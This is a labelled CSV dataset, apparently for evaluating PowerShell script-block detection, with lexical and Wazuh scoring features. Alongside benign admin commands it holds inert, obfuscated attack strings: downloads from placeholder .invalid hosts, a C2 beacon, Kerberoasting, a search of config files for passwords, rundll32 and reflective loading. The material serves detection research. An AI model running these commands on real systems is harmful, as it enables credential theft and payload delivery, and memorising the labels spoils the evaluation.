id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-157,benign,0,0,normal_benign,scheduled_task_list_normal_v1,scheduled_task_list_normal,benign:scheduled_task_list_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,5ee090fb-1113-4ff4-a30a-9cfd2695ccaf,64ea3ea07f408f9a5685d33c1038a6f3cb40295ea15b7aaa4ef26bc344a8c8b7,"Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State",0,,0,0,,,0,,88,1,8,6,0.068182,0.011364,0.090909,4.558768,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-158,benign,0,0,normal_benign,culture_normal_v2,culture_normal,benign:culture_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,b7e68288-9e35-4dc0-ab7d-cd858de0c646,bf17677c59655f1d03fe25fdc9a84539893c9073395958b31ced9f324f42ba78,"Get-Culture | Select-Object Name, DisplayName; Write-Output 'benign variant 2'",0,,0,0,,,0,,78,1,8,8,0.102564,0.012821,0.102564,4.52696,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-159,simulated_malicious,1,1,obfuscated_indicator,dns_txt_channel_backtick_literal,dns_txt_channel,positive:dns_txt_channel,Source-derived inert offensive behavior pattern,Command and Control,DNS,T1071.004,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,2dcf05fb-5ec6-4365-bb8e-329dc2c63881,4b00e87368c46a87c185697ab81f4d17cf84d94a8f0e3741d715395f70a7568c,$indicator='Resolve-DnsName -Type TXT -Name ''task.examp`le.in`valid'' | Select-Obje`ct -Expa`ndP`roperty St`rings'; Write-Output $indicator,6,+2:category_network_c2;+1:backtick_obfuscation;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,140,1,17,25,0.178571,0.0,0.071429,4.885523,1,0,100,0,0,0,6,0,0,0,0,1,Resolve-DnsName,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,4,6,1,5,1,1,0,0,0,0,0,0,0
PST-160,simulated_malicious,1,1,obfuscated_indicator,http_beacon_profile_mixed_case,http_beacon_profile,positive:http_beacon_profile,Source-derived inert offensive behavior pattern,Command and Control,Web Protocols,T1071.001,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,f679d2f5-0a1a-4a43-976b-b939106b1c8f,90c9b4fcb11f76e08b93bdcc6d637f6f11e3478b3acdc5321629d89d72e00f8a,$indicator='$PRoFIle=@{SLeeP=60000;jItter=0.25;USERAgeNT=''MozILlA/5.0'';UrI=''/API/v1/STaTuS''}; INVOKe-webRequest -URI ''httpS://c2.ExamPle.inValiD/ApI/v1/StAtUs'''; Write-Output $indicator,7,+2:category_download;+2:category_network_c2;+2:multiple_high_risk_categories;+1:irregular_case,0,0,,,0,,191,1,22,48,0.251309,0.068063,0.026178,5.390707,1,0,147,0,0,0,0,0,0,0,0,4,MozILlA;STaTuS;StAtUs;c2.ExamPle.inValiD,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0,0,4,1,5,1,1,0,0,0,0,0,0,0
PST-161,simulated_malicious,1,1,obfuscated_indicator,kerberoast_indicator_combined_obfuscation,kerberoast_indicator,positive:kerberoast_indicator,Source-derived inert offensive behavior pattern,Credential Access,Kerberoasting,T1558.003,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,b72fa222-3b5f-4daa-9ad1-cc09be0fd7ce,eeab8fe6a7c99c0e1d1c0604186a50159c444b8d887ebf7eb40cc2cafd81d4e6,"$parts=@('INv`Oke-Ker','bERO`as','t -OuTpU','tFoR`m`aT ','HaSH`cA','t | SEL','ect-obJe','`ct sA','MAcCOu`ntN','`AmE,HASH'); $indicator=($parts -join ''); Write-Output $indicator",9,+2:category_credential_access;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,177,1,26,59,0.333333,0.0,0.056497,4.990823,11,10,83,0,0,0,8,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0,1,5,1,5,1,1,0,0,0,0,0,0,0
PST-162,simulated_malicious,1,1,clear_indicator,recursive_file_discovery_clear,recursive_file_discovery,positive:recursive_file_discovery,Source-derived inert offensive behavior pattern,Discovery,File and Directory Discovery,T1083,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,9a7dc18b-a177-4387-a54c-0aedbb4ab302,c84e17c792f1ca3a70459dd6ade8b550d0204245755784f12a6f7da7cde9f5a4,$indicator='Get-ChildItem ''C:\Users'' -Recurse -Force -ErrorAction SilentlyContinue'; Write-Output $indicator,2,+1:category_discovery;+1:irregular_case,1,1,91820,4,4,Powershell script recursively collected files from a filesystem search,110,1,10,17,0.154545,0.0,0.063636,4.60657,1,0,70,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0,1,5,0,5,0,1,0,1,1,0,0,0,0
PST-163,benign,0,0,normal_benign,route_table_normal_v2,route_table_normal,benign:route_table_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,1eef9795-2d0b-4b70-b734-c9a4914a5b37,f6b4b749c79db1375fb233d969a5fd7ea0007e0a5e21e54675a66a1f748c71c1,"Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,127,1,12,10,0.07874,0.015748,0.094488,4.611445,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetRoute,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-164,simulated_malicious,1,1,obfuscated_indicator,proxy_aware_webclient_string_concatenation,proxy_aware_webclient,positive:proxy_aware_webclient,Source-derived inert offensive behavior pattern,Command and Control,Web Protocols,T1071.001,string_concatenation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,8dbc7699-63fe-4235-881a-5df26584533f,74430387aeb790817891bb48a3fb5ea43a4cc51a9cfc48a7f1a38eb57f1dbe86,$indicator='$wc=New-Object Net' + '.WebClient; $w' + 'c.Proxy=[Net.W' + 'ebRequest]::De' + 'faultWebProxy; $wc.' + 'Headers[''User-Ag' + 'ent'']=''Mozilla/5.0''; ' + '$wc.DownloadSt' + 'ring(''https://cdn' + '.example.invalid/a' + ''')'; Write-Output $indicator,13,+2:category_download;+2:category_network_c2;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,261,1,25,82,0.314176,0.007663,0.099617,4.964987,11,6,167,0,0,0,0,10,0,0,0,1,wc.DownloadSt,0,,0,0,0,2,downloadstring;webclient,1,1,0,2,defaultwebproxy;user-agent,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,0,2,3,1,5,1,1,0,0,0,0,0,0,0
PST-165,benign,0,0,normal_benign,computer_info_normal_v1,computer_info_normal,benign:computer_info_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,65c3de4e-647b-49be-97a2-87bd9be37d8b,60c4e6c9c4433844d8310f2fc71ce81ffc772062cdc93199ffd41637af9a9544,"Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion",1,+1:irregular_case,0,0,,,0,,128,1,9,8,0.0625,0.0,0.070312,4.607767,0,0,0,0,0,0,0,0,0,0,0,1,Get-ComputerInfo,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-166,simulated_malicious,1,1,obfuscated_indicator,credential_file_search_alias_command_reconstruction,credential_file_search,positive:credential_file_search,Source-derived inert offensive behavior pattern,Credential Access,Credentials In Files,T1552.001,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,3f14f0f1-1938-4a2b-b87d-b4a78cc6cf15,8bc5c8a3f815cf2a443fb27a706dd523defd2aab2d4e0960e1081ef8901bb5e1,"$parts=@('Get-Ch','ildItem',' -Path ''','C:\Users'' -','Recurse -I','nclude ''','*.config''',',''*.xml''',' | Select-Str','ing -Pattern',' ''passwor','d|token|secret',''''); $indicator=[string]::Concat($parts); Write-Output $indicator",9,+2:category_credential_access;+1:category_discovery;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,234,1,25,88,0.376068,0.0,0.051282,4.720087,13,13,116,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,2,1,0,3,3,0,1,5,1,5,1,1,0,0,0,0,0,0,0
PST-167,simulated_malicious,1,1,obfuscated_indicator,dynamic_invocation_partial_backtick_literal,dynamic_invocation_partial,positive:dynamic_invocation_partial,Source-derived inert offensive behavior pattern,Execution,PowerShell,T1059.001,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,08285900-4595-42c2-bfc6-9f25eb089136,81db22f638c151a66c63c6119cd91bbd569ccb1d38377fa07ac4413f7ad570d8,"$indicator='$cmd=(''Inv''+''oke-Expres`sion''); & (Get-Com`mand $cmd) ""Write-Output ''TH`ESIS-INERT''""'; Write-Output $indicator",3,+2:category_execution;+1:backtick_obfuscation,0,0,,,0,,128,1,13,38,0.296875,0.0,0.054688,4.917441,1,0,84,0,0,0,3,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-168,benign,0,0,hard_benign,hard_json_processing_v1,hard_json_processing,benign:hard_json_processing,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,88268e74-7e4a-4693-b6fc-19fa1b0e70d6,a048a988c0683a1852b7d2d23fec827f8c997f4677e7eb0cffaf1246607779bb,"$json = '{""server"":""srv-file-01"",""mode"":""audit"",""enabled"":true}'; $json | ConvertFrom-Json | Select-Object server, mode",1,+1:irregular_case,0,0,,,0,,119,1,12,30,0.252101,0.016807,0.07563,4.699805,1,0,54,0,0,0,0,0,0,0,0,1,ConvertFrom-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-169,simulated_malicious,1,1,obfuscated_indicator,bits_transfer_base64_literal_decode_safe,bits_transfer,positive:bits_transfer,Source-derived inert offensive behavior pattern,Defense Evasion,BITS Jobs,T1197,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,e2052e60-02be-43d8-b80e-c539e4752220,dba86e29dba35637b68c5c0b55f5585452902ad22a1ef1ca28a1dcf0713e9434,$encoded='UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,14,+2:category_download;+2:category_defense_evasion;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,402,1,10,27,0.067164,0.032338,0.007463,4.949648,1,0,280,1,280,1,0,0,0,0,0,2,FromBase64String;UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA,0,,0,0,0,1,start-bitstransfer,0,1,1,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1,4,6,1,5,1,1,1,1,1,1,1,1,0
PST-170,benign,0,0,normal_benign,defender_status_read_normal_v2,defender_status_read_normal,benign:defender_status_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,18b36588-1f30-4e09-b0cd-fcb2d5f22288,f69c43d42d27eb3392ca3a707c40ffce1e8bed9a9fea14ec7c5f809a2f60db0f,"Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,134,1,10,9,0.067164,0.007463,0.074627,4.602468,1,1,16,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-171,simulated_malicious,1,1,obfuscated_indicator,rundll32_proxy_execution_string_concatenation,rundll32_proxy_execution,positive:rundll32_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Rundll32,T1218.011,string_concatenation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,29338b00-762e-429d-99eb-50dfeb0b3950,74cc7171aaa3fb200854f5f1d6f42df7adf67a4302aa610c5e380308f794a3e3,"$indicator='rundll3' + '2.e' + 'xe C:\__T' + 'HESIS_I' + 'NERT__\st' + 'age.dll' + ',EntryP' + 'oint'; Write-Output $indicator",8,+2:category_lolbin;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,126,1,13,39,0.309524,0.015873,0.134921,4.71937,8,8,53,0,0,0,0,7,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0,4,6,1,5,1,1,0,0,0,0,0,0,0
PST-172,benign,0,0,hard_benign,hard_mixed_case_variable_names_v2,hard_mixed_case_variable_names,benign:hard_mixed_case_variable_names,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,b840c6c6-784b-456b-a1f5-73cb283ff964,eeb4944cba58c97087d16c83699f88415174fb32ae11ec1e18bb676c4146a9c8,$SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output 'hard benign variant 2',5,+1:category_remote_execution;+1:string_reconstruction;+1:irregular_case;+2:combined_obfuscation,1,1,91816,4,4,Powershell script querying system environment variables,141,1,13,24,0.170213,0.007092,0.113475,4.90549,3,2,30,0,0,0,0,2,0,0,0,2,AuDiTMoDe;SeRvErNaMe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0,0,4,1,5,1,1,1,1,1,0,0,0,0
PST-173,benign,0,0,normal_benign,share_inventory_normal_v2,share_inventory_normal,benign:share_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,0d8b5649-b1f2-474e-8170-aa06d6c4b2a0,d7ba7b41f238f32135415386a09819ce0519247a359b426e1c38540c267c2afe,"Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,111,1,12,10,0.09009,0.018018,0.108108,4.621384,1,1,16,0,0,0,0,0,0,0,0,1,Get-SmbShare,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-174,benign,0,0,normal_benign,system_eventlog_normal_v1,system_eventlog_normal,benign:system_eventlog_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,3ee6269b-2da9-46e2-bf8c-03a14c87c1e7,a882d61d2538e1e794db753d214b6aacb2a4e69b6dfb6ca7e303d1d2ee85856b,"Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated",1,+1:irregular_case,0,0,,,0,,87,1,9,7,0.08046,0.011494,0.103448,4.626151,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-175,simulated_malicious,1,1,clear_indicator,bits_transfer_clear,bits_transfer,positive:bits_transfer,Source-derived inert offensive behavior pattern,Defense Evasion,BITS Jobs,T1197,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,b45007b9-ebea-4f74-b2ec-2334917603b9,7f6dcec4f67959543c01de310676f2eb553164c55191bc0270af5a96598319e4,$indicator='Start-BitsTransfer -Source ''https://bits.example.invalid/payload.bin'' -Destination ''$env:TEMP\cache.bin'''; Write-Output $indicator,2,+2:category_download,1,1,91816,4,4,Powershell script querying system environment variables,146,1,11,29,0.19863,0.0,0.041096,4.786099,1,0,104,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,start-bitstransfer,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,4,6,0,5,0,1,0,1,1,0,0,0,0
PST-176,benign,0,0,normal_benign,csv_formatting_normal_v1,csv_formatting_normal,benign:csv_formatting_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,d5620b7f-bf48-4101-ac58-014e2b91cc48,851d1b04fce471328c049b01574104bcd8ee18227eec3871c61679be050307be,"Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation",2,+1:category_discovery;+1:irregular_case,1,1,91815,4,4,Powershell executing process discovery,80,1,8,8,0.1,0.0125,0.1125,4.588574,0,0,0,0,0,0,0,0,0,0,0,1,ConvertTo-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0,3,4,0,5,0,1,0,1,1,0,0,0,0
PST-177,simulated_malicious,1,1,obfuscated_indicator,invoke_webrequest_outfile_mixed_case,invoke_webrequest_outfile,positive:invoke_webrequest_outfile,Source-derived inert offensive behavior pattern,Command and Control,Ingress Tool Transfer,T1105,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,0b1ffff2-2762-4351-b021-722883d466ba,ed4d7d7a6f8c9fad820ba7490ecc3ca01fbee1b08a63acb282a6bc02f33d8c7b,$indicator='InvokE-wEbrEquEsT -uRi ''HtTPs://FILes.examPlE.invAlid/UpdATe.BiN'' -oUTFiLE ''$ENv:temp\UpdATe.BIN'''; Write-Output $indicator,3,+2:category_download;+1:irregular_case,1,1,91816,4,4,Powershell script querying system environment variables,139,1,11,29,0.208633,0.0,0.043165,5.142147,1,0,97,0,0,0,0,0,0,0,0,4,FILes.examPlE.invAlid;InvokE-wEbrEquEsT;UpdATe.BIN;UpdATe.BiN,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,0,1,1,1,1,0,0,0,0
PST-178,simulated_malicious,1,1,clear_indicator,reflection_load_partial_clear,reflection_load_partial,positive:reflection_load_partial,Source-derived inert offensive behavior pattern,Defense Evasion,Reflective Code Loading,T1620,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,dbf493e7-2156-493a-81bf-7cc1a864b743,28fc700f8bdc9d3d7acdf4af21d5666b227be8b567e2d9990c5c6d23b8e8c845,$indicator='[Reflection.Assembly]::Load([Convert]::FromBase64String(''VEhFU0lTLUlORVJULURVTU1Z''))'; Write-Output $indicator,6,+2:category_defense_evasion;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,124,1,8,24,0.193548,0.032258,0.016129,5.313558,1,0,84,1,24,1,0,0,0,0,0,1,FromBase64String,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0,3,4,1,5,1,1,1,1,1,1,1,1,0
